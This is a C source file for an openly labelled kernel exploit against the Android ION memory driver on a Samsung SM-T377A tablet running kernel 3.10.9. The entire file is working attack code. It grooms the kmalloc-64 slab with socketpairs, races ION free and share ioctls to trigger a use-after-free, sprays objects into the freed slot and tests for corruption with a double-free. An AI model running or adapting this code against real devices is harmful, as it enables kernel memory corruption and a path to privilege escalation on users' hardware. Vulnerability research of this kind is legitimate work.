#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>

/* ION ioctls */
#define ION_IOC_ALLOC   _IOWR('I', 0, struct ion_allocation_data)
#define ION_IOC_FREE    _IOWR('I', 1, struct ion_handle_data)
#define ION_IOC_SHARE   _IOWR('I', 4, struct ion_fd_data)

struct ion_allocation_data {
    size_t len;
    size_t align;
    unsigned int heap_id_mask;
    unsigned int flags;
    int handle;
};
struct ion_handle_data { int handle; };
struct ion_fd_data { int handle; int fd; };

/* Globals for race */
static int g_ion_fd;
static int g_handle;
static volatile int g_free_done = 0;
static volatile int g_share_fd = -1;

static void* free_thread(void* arg) {
    struct ion_handle_data hd = { .handle = g_handle };
    ioctl(g_ion_fd, ION_IOC_FREE, &hd);
    g_free_done = 1;
    return NULL;
}

static void alarm_handler(int sig) {
    printf("[!] TIMEOUT - exiting safely\n");
    _exit(1);
}

/*
 * ION UAF + socketpair reclaim exploit
 *
 * Phase 1: Heap grooming - fill kmalloc-64 with socketpairs
 * Phase 2: Create holes by closing some pairs
 * Phase 3: Allocate ION handles into kmalloc-64 holes
 * Phase 4: Race FREE+SHARE, then spray socketpairs into freed slot
 * Phase 5: Probe the freed handle via double-free to detect reclaim
 */
int main() {
    int ret, i;

    signal(SIGALRM, alarm_handler);
    alarm(30);

    printf("=== ION UAF + socketpair Exploit ===\n");
    printf("=== SM-T377A kernel 3.10.9 ARM32 ===\n\n");

    /* Pin to CPU 0 for SLUB locality */
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);

    /* Phase 1: Pre-fill kmalloc-64 with socketpairs */
    printf("[*] Phase 1: Pre-filling kmalloc-64...\n");
    int pairs[500][2];
    for (i = 0; i < 500; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, pairs[i]) < 0) {
            printf("[!] socketpair failed at %d: %s\n", i, strerror(errno));
            break;
        }
    }
    printf("[+] Created %d socketpairs (%d fds)\n", i, i * 2);
    int total_pairs = i;

    /* Phase 2: Create holes (close every 4th pair to fragment slab) */
    printf("[*] Phase 2: Creating holes in slab...\n");
    int holes = 0;
    for (i = 0; i < total_pairs; i += 4) {
        close(pairs[i][0]);
        close(pairs[i][1]);
        pairs[i][0] = -1;
        pairs[i][1] = -1;
        holes++;
    }
    printf("[+] Punched %d holes\n", holes);

    /* Phase 3: Allocate ION handles into the holes */
    printf("[*] Phase 3: Allocating ION handles...\n");
    g_ion_fd = open("/dev/ion", O_RDONLY);
    if (g_ion_fd < 0) {
        printf("[!] Cannot open /dev/ion: %s\n", strerror(errno));
        return 1;
    }

    int handles[20];
    int handle_count = 0;
    for (i = 0; i < 20; i++) {
        struct ion_allocation_data alloc = {
            .len = 4096,
            .align = 4096,
            .heap_id_mask = 1,
            .flags = 0,
        };
        if (ioctl(g_ion_fd, ION_IOC_ALLOC, &alloc) == 0) {
            handles[i] = alloc.handle;
            handle_count++;
        }
    }
    printf("[+] Allocated %d ION handles\n", handle_count);

    /* Phase 4: Race FREE+SHARE on each handle, spray into freed slot */
    printf("[*] Phase 4: Racing FREE+SHARE with socketpair spray...\n");

    int wins = 0, corruptions = 0;

    for (int trial = 0; trial < handle_count; trial++) {
        g_handle = handles[trial];
        g_free_done = 0;
        g_share_fd = -1;

        /* Race: FREE in thread, SHARE in main */
        pthread_t tid;
        pthread_create(&tid, NULL, free_thread, NULL);

        /* Try SHARE immediately */
        struct ion_fd_data share = { .handle = g_handle, .fd = -1 };
        ret = ioctl(g_ion_fd, ION_IOC_SHARE, &share);

        pthread_join(tid, NULL);

        if (ret == 0 && share.fd >= 0 && g_free_done) {
            wins++;

            /* Spray socketpairs into the freed kmalloc-64 slot */
            int spray_pairs[50][2];
            int spray_count = 0;
            for (int s = 0; s < 50; s++) {
                if (socketpair(AF_UNIX, SOCK_STREAM, 0, spray_pairs[s]) == 0)
                    spray_count++;
            }

            /* mmap the dma_buf fd - buffer ref was captured before handle freed */
            void *mapped = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                                MAP_SHARED, share.fd, 0);
            if (mapped != MAP_FAILED) {
                unsigned int *words = (unsigned int *)mapped;
                printf("[+] Trial %d: mmap OK, first words: %08x %08x %08x %08x\n",
                       trial, words[0], words[1], words[2], words[3]);
                munmap(mapped, 4096);
            } else {
                printf("[!] Trial %d: mmap FAILED: %s\n", trial, strerror(errno));
            }

            /* Key test: double-free on the same handle ID.
             * If slot was reclaimed by socketpair, this second FREE will
             * interpret socketpair data as ion_handle and may corrupt it. */
            struct ion_handle_data hd2 = { .handle = g_handle };
            ret = ioctl(g_ion_fd, ION_IOC_FREE, &hd2);
            printf("    Double-free attempt: ret=%d errno=%d (%s)\n",
                   ret, errno, strerror(errno));
            if (ret == 0) {
                corruptions++;
                printf("[!!!] DOUBLE-FREE SUCCEEDED - handle was still in rbtree!\n");
            }

            close(share.fd);

            /* Clean up spray */
            for (int s = 0; s < spray_count; s++) {
                close(spray_pairs[s][0]);
                close(spray_pairs[s][1]);
            }
        }
    }

    printf("\n[*] Results: %d/%d race wins, %d corruptions detected\n",
           wins, handle_count, corruptions);

    /* Phase 5: Cleanup */
    close(g_ion_fd);
    for (i = 0; i < total_pairs; i++) {
        if (pairs[i][0] >= 0) close(pairs[i][0]);
        if (pairs[i][1] >= 0) close(pairs[i][1]);
    }

    printf("[*] Done.\n");
    return 0;
}
